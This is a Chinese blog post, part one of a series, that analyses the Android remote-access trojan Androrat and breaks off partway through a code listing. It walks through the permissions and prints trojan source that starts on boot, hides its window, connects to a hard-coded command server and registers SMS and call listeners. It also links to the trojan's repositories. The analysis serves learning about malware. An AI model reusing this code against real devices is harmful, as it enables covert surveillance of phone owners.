@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+  <head>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      剖析安卓木马Androrat（一） &middot; 奇门遁甲
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/public/css/poole.css">
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/hyde.css">
+  <link rel="stylesheet" href="/public/css/label.css">
+  <link rel="stylesheet" href="/public/css/global.css">
+
+  <!-- Icons -->
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+
+</head>
+
+
+  <body class="theme-base-ff">
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          奇门遁甲
+        </a>
+      </h1>
+      <p class="lead"></p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+
+
+      </ul>
+      
+
+      
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/about.html">About</a>
+          
+        
+      
+        
+      
+        
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/tags.html">标签</a>
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+
+        <a class="sidebar-nav-item" href="/categories.html" >文章分类</a>
+        <ul class="sidebar-nav-subitem">
+            
+            <li><a href="/categories.html#读书">读书 <small>(4)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#随想">随想 <small>(5)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#技术">技术 <small>(9)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#no-category">未分类</a>
+            </li>
+        </ul>
+    </nav>
+
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title">剖析安卓木马Androrat（一）</h1>
+  <p>
+      <span >09 Apr 2017 by
+          <a href="#">tang3</a>
+      </span>&nbsp;&nbsp;
+      
+  </p>
+  <h2 id="0x00-前言">0x00 前言</h2>
+
+<p>很久远写的一个系列的文章了，本来遗忘在硬盘的某个角落的。直到前两周有个小朋友发邮件问我这个系列的后两篇在哪里，才知道自己的文章还是可以帮助到一些人的，所以从硬盘扒了出来，放到<a href="www.tang3.org">奇门遁甲</a>上，供各位视奸~</p>
+
+<hr />
+
+<p>之前有一个想法，想通过学习Android木马的编写来了解Android程序的编写，刚好看到了Bincker给的一个<a href="http://blog.csdn.net/bincker/article/details/40833339">《安卓木马编写教程》</a>。刚照着教程写完了一个入门程序，就无意间在WooYun上发现了Androrat的这个木马，看上去功能挺强大的，就决定来看一看它都是怎么实现各种功能的。</p>
+
+<p>这篇文章对于我整个分析过程的重新整理，一方面为了给自己做个记录，另一方面给想要涉及Android领域的同学先抛一块砖垫脚。</p>
+
+<h2 id="0x01-androidmanifest分析">0x01 AndroidManifest分析</h2>
+
+<p>国际惯例，我们先来看AndroidManifest.xml中提供的信息。先来看权限：</p>
+
+<p><img src="/assets/images/2017-04/permission.png" alt="permission" /></p>
+
+<p>可以看到申请了以下这些权限（Android权限信息请参考<a href="(http://developer.android.com/reference/android/Manifest.permission.html)">这里</a>)：</p>
+
+<ul>
+  <li>短信提醒接收</li>
+  <li>读、发短信</li>
+  <li>获取手机状态</li>
+  <li>处理拨出电话</li>
+  <li>获取网络状态</li>
+  <li>获取精确定位</li>
+  <li>连接网络</li>
+  <li>录音</li>
+  <li>扩展存储（SD卡）写</li>
+  <li>相机</li>
+  <li>开机启动</li>
+  <li>拨打电话</li>
+  <li>获取通讯录</li>
+  <li>震动</li>
+</ul>
+
+<p>从申请的这些权限，我们不难猜到这个木马所能够实现的功能。下面我们继续来看AndroidManfest中application中定义的模块：有两个receiver，一个开机启动监听，一个没有定义action；两个activity，一个主界面，一个看名字貌似和照片相关的界面；一个service，木马的主服务。具体定义内容如下：</p>
+
+<p><img src="/assets/images/2017-04/application.png" alt="application" /></p>
+
+<p>从上面这些内容来看,我们分析的入手点有两个，一个是开机启动的那个处理，另一个就是主界面，下面我们挨个来看一看它们都做了什么。</p>
+
+<h2 id="0x02-开机启动处理过程分析">0x02 开机启动处理过程分析</h2>
+
+<p>代码如下：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">BootReceiver</span> <span class="kd">extends</span> <span class="n">BroadcastReceiver</span> <span class="o">{</span>
+	
+	<span class="kd">public</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">TAG</span> <span class="o">=</span> <span class="n">BootReceiver</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getSimpleName</span><span class="o">();</span>
+	
+	<span class="nd">@Override</span>
+	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="n">Context</span> <span class="n">context</span><span class="o">,</span> <span class="n">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
+		<span class="n">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">TAG</span><span class="o">,</span><span class="s">"BOOT Complete received by Client !"</span><span class="o">);</span>
+		
+		<span class="n">String</span> <span class="n">action</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getAction</span><span class="o">();</span>
+		
+		<span class="k">if</span><span class="o">(</span><span class="n">action</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">Intent</span><span class="o">.</span><span class="na">ACTION_BOOT_COMPLETED</span><span class="o">))</span> <span class="o">{</span> <span class="c1">//android.intent.action.BOOT_COMPLETED</span>
+			<span class="n">Intent</span> <span class="n">serviceIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="n">context</span><span class="o">,</span> <span class="n">Client</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+			<span class="n">serviceIntent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="n">BootReceiver</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getSimpleName</span><span class="o">());</span>
+			<span class="n">context</span><span class="o">.</span><span class="na">startService</span><span class="o">(</span><span class="n">serviceIntent</span><span class="o">);</span>
+		<span class="o">}</span>
+	<span class="o">}</span>
+
+<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>代码很简单，判断action是不是开机启动的action，如果是就初始化一个启动Client的Intent，设置这个Intent的action为当前类名（这一步的作用只是为了让Client在log中打印是哪个应用开启了服务，应该是为了方便调试），最后启动Client服务，说白了就是是做了一个Client服务的启动（关于Client的实现，我会作为正餐在后面给出详细的分析）。</p>
+
+<h2 id="0x03-主界面处理过程分析">0x03 主界面处理过程分析</h2>
+
+<p>还是先看代码：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">LauncherActivity</span> <span class="kd">extends</span> <span class="n">Activity</span> <span class="o">{</span>
+    <span class="cm">/** Called when the activity is first created. */</span>
+	
+	<span class="n">Intent</span> <span class="n">Client</span><span class="o">,</span> <span class="n">ClientAlt</span><span class="o">;</span>
+	<span class="n">Button</span> <span class="n">btnStart</span><span class="o">,</span> <span class="n">btnStop</span><span class="o">;</span>
+	<span class="n">EditText</span> <span class="n">ipfield</span><span class="o">,</span> <span class="n">portfield</span><span class="o">;</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="n">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+        <span class="n">setContentView</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">main</span><span class="o">);</span>
+        
+        <span class="n">Client</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">Client</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">Client</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="n">LauncherActivity</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+        
+        <span class="n">btnStart</span> <span class="o">=</span> <span class="o">(</span><span class="n">Button</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">buttonstart</span><span class="o">);</span>
+        <span class="n">btnStop</span> <span class="o">=</span> <span class="o">(</span><span class="n">Button</span><span class="o">)</span> <span class="n">findViewById</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">id</span><span class="o">.</span><span class="na">buttonstop</span><span class="o">);</span>
+       <span class="c1">// ipfield = (EditText) findViewById(R.id.ipfield);</span>
+       <span class="c1">// portfield = (EditText) findViewById(R.id.portfield);</span>
+        
+        <span class="n">btnStart</span><span class="o">.</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">new</span> <span class="n">View</span><span class="o">.</span><span class="na">OnClickListener</span><span class="o">()</span> <span class="o">{</span>
+            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onClick</span><span class="o">(</span><span class="n">View</span> <span class="n">view</span><span class="o">)</span> <span class="o">{</span>
+            	<span class="n">Client</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"IP"</span><span class="o">,</span> <span class="n">ipfield</span><span class="o">.</span><span class="na">getText</span><span class="o">().</span><span class="na">toString</span><span class="o">());</span>
+            	<span class="n">Client</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"PORT"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Integer</span><span class="o">(</span><span class="n">portfield</span><span class="o">.</span><span class="na">getText</span><span class="o">().</span><span class="na">toString</span><span class="o">()));</span>
+                <span class="n">startService</span><span class="o">(</span><span class="n">Client</span><span class="o">);</span>
+                <span class="n">btnStart</span><span class="o">.</span><span class="na">setEnabled</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
+                <span class="n">btnStop</span><span class="o">.</span><span class="na">setEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+             
+                
+                <span class="c1">//finish();                </span>
+            <span class="o">}</span>
+        <span class="o">});</span>
+        
+		
+		<span class="n">Client</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"IP"</span><span class="o">,</span><span class="s">"172.16.1.60"</span><span class="o">);</span>
+		<span class="n">Client</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"PORT"</span><span class="o">,</span><span class="mi">7777</span><span class="o">);</span>
+      <span class="c1">//  Client.putExtra("IP", ipfield.getText().toString());</span>
+    <span class="c1">//	Client.putExtra("PORT", new Integer(portfield.getText().toString()));</span>
+        <span class="n">startService</span><span class="o">(</span><span class="n">Client</span><span class="o">);</span>
+        <span class="n">btnStart</span><span class="o">.</span><span class="na">setEnabled</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
+        <span class="n">btnStop</span><span class="o">.</span><span class="na">setEnabled</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
+        <span class="n">moveTaskToBack</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"启动服务"</span><span class="o">);</span>
+
+
+
+
+        
+        <span class="n">btnStop</span><span class="o">.</span><span class="na">setOnClickListener</span><span class="o">(</span><span class="k">new</span> <span class="n">View</span><span class="o">.</span><span class="na">OnClickListener</span><span class="o">()</span> <span class="o">{</span>
+            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onClick</span><span class="o">(</span><span class="n">View</span> <span class="n">view</span><span class="o">)</span> <span class="o">{</span>             
+                <span class="n">stopService</span><span class="o">(</span><span class="n">Client</span><span class="o">);</span>  
+                <span class="n">btnStart</span><span class="o">.</span><span class="na">setEnabled</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">btnStop</span><span class="o">.</span><span class="na">setEnabled</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
+                <span class="c1">//finish(); </span>
+            <span class="o">}</span>
+        <span class="o">});</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>先定义一个调用Client的Intent，设置action。后面的代码创建了一个Start和Stop按钮，Start按钮从ipfield和portfield中抽取ip和port，添加到Intent携带的数据中（在Client设定连接到的服务端信息），然后启动Client服务，禁用Start按钮，开启Stop按钮。Stop按钮的实现写在了最后，停止Client服务，然后打开Start按钮，禁用Stop按钮。不过不知道作者怎么想的，把ipfield和portfield禁用掉了，所以这个功能就一直都是废掉的。如果想要使用它们，可以修改代码中对于ipfield和portfiled的注释部分，在界面这设计中添加id为ipfield和portfield的输入框。</p>
+
+<p>我的代码是从《如何玩转andriod远控（androrat）》作者提供的网盘上下载的，在Androrat项目的GitHub项目里没有看关于界面的代码，应该是这篇文章作者用做文章的示例代码。</p>
+
+<p>这里有一点小的八卦信息，GitHub上面搜索Androrat，从返回的和这个项目相关的内容中可以看出原作者是一个叫RobinDavid的法国人（注释中满满的全是看不懂的鸟文o(╯□╰)o），但是我在作者自己的GitHub中没有找到这个项目，而且这个项目应该是作者在2012年11月开发的，至于原因什么的各位看官自己去联想吧。</p>
+
+<p>这个项目目前在GitHub上Wooyun的wszf（猥琐zf？）在维护，我看了下历史更新，貌似改动挺大。还有一个是一个国外的人fork的，没有什么改动，原汁原味的，大家喜欢哪个就去下哪个吧，链接如下：</p>
+
+<ul>
+  <li><a href="https://github.com/wszf/androrat/tree/master/src/AndroratServer/inout">wszf的androrat</a></li>
+  <li><a href="https://github.com/DesignativeDave/androrat">原版的androrat</a></li>
+</ul>
+
+<h2 id="0x04-核心client类分析">0x04 核心Client类分析</h2>
+
+<p>每当一个服务建立后，都会由系统调用它们的onCreate方法，所以我们先来看Client的OnCreate方法的代码：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">()</span> <span class="o">{</span>
+		<span class="n">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">TAG</span><span class="o">,</span> <span class="s">"In onCreate"</span><span class="o">);</span>
+		<span class="n">infos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SystemInfo</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+		<span class="n">procCmd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessCommand</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+		
+		<span class="n">loadPreferences</span><span class="o">();</span>
+	<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>进行了几步初始化操作，SystemInfo类是用于读取系统信息的类，ProcessCommand类则是用于处理Server发送的命令的类，loadPrefererences用于初始化各个参数，我们来看它的代码：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">loadPreferences</span><span class="o">()</span> <span class="o">{</span>
+		<span class="n">PreferencePacket</span> <span class="n">p</span> <span class="o">=</span> <span class="n">procCmd</span><span class="o">.</span><span class="na">loadPreferences</span><span class="o">();</span>
+		<span class="n">waitTrigger</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">isWaitTrigger</span><span class="o">();</span>
+		<span class="n">ip</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">getIp</span><span class="o">();</span>
+		<span class="n">port</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">getPort</span><span class="o">();</span>
+		<span class="n">authorizedNumbersCall</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">getPhoneNumberCall</span><span class="o">();</span>
+		<span class="n">authorizedNumbersSMS</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">getPhoneNumberSMS</span><span class="o">();</span>
+		<span class="n">authorizedNumbersKeywords</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="na">getKeywordSMS</span><span class="o">();</span>
+	<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>使用ProcessCommand的loadPreference方法通过读取perference设置的内容来初始化监控信息，包括Server的ip和port、指定是否开启来电或短信提醒触发Client启动、指定特别关注的号码电话或者短信、指定监听特定关键字短信，然后将内容添加到成员变量当中。其中perference的设置需要在连接Server时被远程设定，所以默认初始的ip和port都是被直接写在代码中的。下面为ProcessCommand的loadPreference方法详细代码：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kd">public</span> <span class="n">PreferencePacket</span> <span class="nf">loadPreferences</span><span class="o">()</span>
+	<span class="o">{</span>
+		<span class="n">PreferencePacket</span> <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PreferencePacket</span><span class="o">();</span>
+		
+		<span class="n">SharedPreferences</span> <span class="n">settings</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="na">getSharedPreferences</span><span class="o">(</span><span class="s">"preferences"</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
+
+		<span class="n">p</span><span class="o">.</span><span class="na">setIp</span><span class="o">(</span> <span class="n">settings</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"ip"</span><span class="o">,</span> <span class="s">"172.16.1.60"</span><span class="o">));</span>
+		<span class="n">p</span><span class="o">.</span><span class="na">setPort</span> <span class="o">(</span><span class="n">settings</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="s">"port"</span><span class="o">,</span> <span class="mi">7777</span><span class="o">));</span>
+		<span class="n">p</span><span class="o">.</span><span class="na">setWaitTrigger</span><span class="o">(</span><span class="n">settings</span><span class="o">.</span><span class="na">getBoolean</span><span class="o">(</span><span class="s">"waitTrigger"</span><span class="o">,</span> <span class="kc">false</span><span class="o">));</span>
+		
+		<span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">smsKeyWords</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;();</span>
+		<span class="n">String</span> <span class="n">keywords</span> <span class="o">=</span> <span class="n">settings</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"smsKeyWords"</span><span class="o">,</span> <span class="s">""</span><span class="o">);</span>
+		<span class="k">if</span><span class="o">(</span><span class="n">keywords</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">""</span><span class="o">))</span>
+			<span class="n">smsKeyWords</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+		<span class="k">else</span> <span class="o">{</span>
+			<span class="n">StringTokenizer</span> <span class="n">st</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringTokenizer</span><span class="o">(</span><span class="n">keywords</span><span class="o">,</span> <span class="s">";"</span><span class="o">);</span>
+			<span class="k">while</span> <span class="o">(</span><span class="n">st</span><span class="o">.</span><span class="na">hasMoreTokens</span><span class="o">())</span>
+			<span class="o">{</span>
+				<span class="n">smsKeyWords</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">st</span><span class="o">.</span><span class="na">nextToken</span><span class="o">());</span>
+			<span class="o">}</span>
+			<span class="n">p</span><span class="o">.</span><span class="na">setKeywordSMS</span><span class="o">(</span><span class="n">smsKeyWords</span><span class="o">);</span>
+		<span class="o">}</span>
+		
+		<span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">whiteListCall</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;();</span>
+		<span class="n">String</span> <span class="n">listCall</span> <span class="o">=</span> <span class="n">settings</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"numCall"</span><span class="o">,</span> <span class="s">""</span><span class="o">);</span>
+		<span class="k">if</span><span class="o">(</span><span class="n">listCall</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">""</span><span class="o">))</span>
+			<span class="n">whiteListCall</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+		<span class="k">else</span> <span class="o">{</span>
+			<span class="n">StringTokenizer</span> <span class="n">st</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringTokenizer</span><span class="o">(</span><span class="n">listCall</span><span class="o">,</span> <span class="s">";"</span><span class="o">);</span>
+			<span class="k">while</span> <span class="o">(</span><span class="n">st</span><span class="o">.</span><span class="na">hasMoreTokens</span><span class="o">())</span>
+			<span class="o">{</span>
+				<span class="n">whiteListCall</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">st</span><span class="o">.</span><span class="na">nextToken</span><span class="o">());</span>
+			<span class="o">}</span>
+			<span class="n">p</span><span class="o">.</span><span class="na">setPhoneNumberCall</span><span class="o">(</span><span class="n">whiteListCall</span><span class="o">);</span>
+		<span class="o">}</span>
+		
+		
+		<span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">whiteListSMS</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;();</span>
+		<span class="n">String</span> <span class="n">listSMS</span> <span class="o">=</span> <span class="n">settings</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"numSMS"</span><span class="o">,</span> <span class="s">""</span><span class="o">);</span>
+		<span class="k">if</span><span class="o">(</span><span class="n">listSMS</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">""</span><span class="o">))</span>
+			<span class="n">whiteListSMS</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+		<span class="k">else</span> <span class="o">{</span>
+			<span class="n">StringTokenizer</span> <span class="n">st</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringTokenizer</span><span class="o">(</span><span class="n">listSMS</span><span class="o">,</span> <span class="s">";"</span><span class="o">);</span>
+			<span class="k">while</span> <span class="o">(</span><span class="n">st</span><span class="o">.</span><span class="na">hasMoreTokens</span><span class="o">())</span>
+			<span class="o">{</span>
+				<span class="n">whiteListSMS</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">st</span><span class="o">.</span><span class="na">nextToken</span><span class="o">());</span>
+			<span class="o">}</span>
+			<span class="n">p</span><span class="o">.</span><span class="na">setPhoneNumberSMS</span><span class="o">(</span><span class="n">whiteListSMS</span><span class="o">);</span>
+		<span class="o">}</span>
+		<span class="k">return</span> <span class="n">p</span><span class="o">;</span>
+	<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>之后根据我们前面分析的BootReceiver和AndroratActivity可以知道Client服务的启动是靠startService方法来启动的，而这个方法会触发Client的onStartCommand的方法。下面我们来一段一段的来分析这个方法，先来看第一段：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>	<span class="kd">public</span> <span class="kt">int</span> <span class="nf">onStartCommand</span><span class="o">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="o">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="o">,</span> <span class="kt">int</span> <span class="n">startId</span><span class="o">)</span> <span class="o">{</span>
+		<span class="c1">//toast = Toast.makeText(this	,"Prepare to laod", Toast.LENGTH_LONG);</span>
+		<span class="c1">//loadPreferences("preferences");</span>
+		<span class="c1">//Intent i = new Intent(this,Preferences.class);</span>
+		<span class="c1">//startActivity(i);</span>
+		<span class="k">if</span><span class="o">(</span><span class="n">intent</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
+			<span class="k">return</span> <span class="n">START_STICKY</span><span class="o">;</span>
+		<span class="n">String</span> <span class="n">who</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getAction</span><span class="o">();</span>
+		<span class="n">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">TAG</span><span class="o">,</span> <span class="s">"onStartCommand by: "</span><span class="o">+</span> <span class="n">who</span><span class="o">);</span> <span class="c1">//On affiche qui a déclenché l'event</span>
+		
+		<span class="k">if</span> <span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">hasExtra</span><span class="o">(</span><span class="s">"IP"</span><span class="o">))</span>
+			<span class="k">this</span><span class="o">.</span><span class="na">ip</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getExtras</span><span class="o">().</span><span class="na">getString</span><span class="o">(</span><span class="s">"IP"</span><span class="o">);</span>
+		<span class="k">if</span> <span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">hasExtra</span><span class="o">(</span><span class="s">"PORT"</span><span class="o">))</span>
+			<span class="k">this</span><span class="o">.</span><span class="na">port</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getExtras</span><span class="o">().</span><span class="na">getInt</span><span class="o">(</span><span class="s">"PORT"</span><span class="o">);</span>		
+		
+		<span class="k">if</span><span class="o">(!</span><span class="n">isRunning</span><span class="o">)</span> <span class="o">{</span><span class="c1">// C'est la première fois qu'on le lance</span>
+			
+		  	<span class="c1">//--- On ne passera qu'une fois ici ---</span>
+		    <span class="n">IntentFilter</span> <span class="n">filterc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">IntentFilter</span><span class="o">(</span><span class="s">"android.net.conn.CONNECTIVITY_CHANGE"</span><span class="o">);</span> <span class="c1">//Va monitorer la connexion</span>
+		    <span class="n">registerReceiver</span><span class="o">(</span><span class="n">ConnectivityCheckReceiver</span><span class="o">,</span> <span class="n">filterc</span><span class="o">);</span>
+			<span class="n">isRunning</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+			<span class="n">conn</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Connection</span><span class="o">(</span><span class="n">ip</span><span class="o">,</span><span class="n">port</span><span class="o">,</span><span class="k">this</span><span class="o">);</span><span class="c1">//On se connecte et on lance les threads</span>
+			
+			<span class="k">if</span><span class="o">(</span><span class="n">waitTrigger</span><span class="o">)</span> <span class="o">{</span> <span class="c1">//On attends un evenement pour se connecter au serveur</span>
+			  	<span class="c1">//On ne fait rien</span>
+				<span class="n">registerSMSAndCall</span><span class="o">();</span>
+			<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>先从intent参数中提取action（还记得前面开机启动和主界面类中的setAction方法吗？），然后在日志里打印此时服务是被哪个向量触发的，这样写应该是为了方便调试，比较容易找到出现问题的模块。后面是从intent中抽取ip和port（如果有的话），判断服务是否已经运行了，如果没有则创建网络连接变化监听（这是为了在切换网络连接的时候，可以重新建立监听）。在后面，置inRunning为true，创建连接，如果在配置中设定了是否开启来电或短信提醒触发Client启动，则使用registerSMSAndCall方法，注册短信监听和来电监听（关于这两个监听触发的代码，我们留着后面再分析，这次我们先重点看Client的逻辑）。registerSMSAndCall代码如下：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">registerSMSAndCall</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">IntentFilter</span> <span class="n">filter</span> <span class="o">=</span> <span class="k">new</span> <span class="n">IntentFilter</span><span class="o">();</span>
+        <span class="n">filter</span><span class="o">.</span><span class="na">addAction</span><span class="o">(</span><span class="s">"android.provider.Telephony.SMS_RECEIVED"</span><span class="o">);</span> <span class="c1">//On enregistre un broadcast receiver sur la reception de SMS</span>
+        <span class="n">registerReceiver</span><span class="o">(</span><span class="n">SMSreceiver</span><span class="o">,</span> <span class="n">filter</span><span class="o">);</span>
+        <span class="n">IntentFilter</span> <span class="n">filter2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">IntentFilter</span><span class="o">();</span>
+        <span class="n">filter2</span><span class="o">.</span><span class="na">addAction</span><span class="o">(</span><span class="s">"android.intent.action.PHONE_STATE"</span><span class="o">);</span><span class="c1">//TelephonyManager.ACTION_PHONE_STATE_CHANGED); //On enregistre un broadcast receiver sur la reception de SMS</span>
+        <span class="n">registerReceiver</span><span class="o">(</span><span class="n">Callreceiver</span><span class="o">,</span> <span class="n">filter2</span><span class="o">);</span>
+	<span class="o">}</span>
+
+</code></pre>
+</div>
+
+<p>下面我们再来看witTrigger设置为false时的处理代码：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="k">else</span> <span class="o">{</span>
+				<span class="n">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">TAG</span><span class="o">,</span><span class="s">"Try to connect to "</span><span class="o">+</span><span class="n">ip</span><span class="o">+</span><span class="s">":"</span><span class="o">+</span><span class="n">port</span><span class="o">);</span>
+				<span class="k">if</span><span class="o">(</span><span class="n">conn</span><span class="o">.</span><span class="na">connect</span><span class="o">())</span> <span class="o">{</span>
+					<span class="n">packet</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CommandPacket</span><span class="o">();</span>
+					<span class="n">readthread</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Thread</span><span class="o">(</span><span class="k">new</span> <span class="n">Runnable</span><span class="o">()</span> <span class="o">{</span> <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span> <span class="n">waitInstruction</span><span class="o">();</span> <span class="o">}</span> <span class="o">});</span>
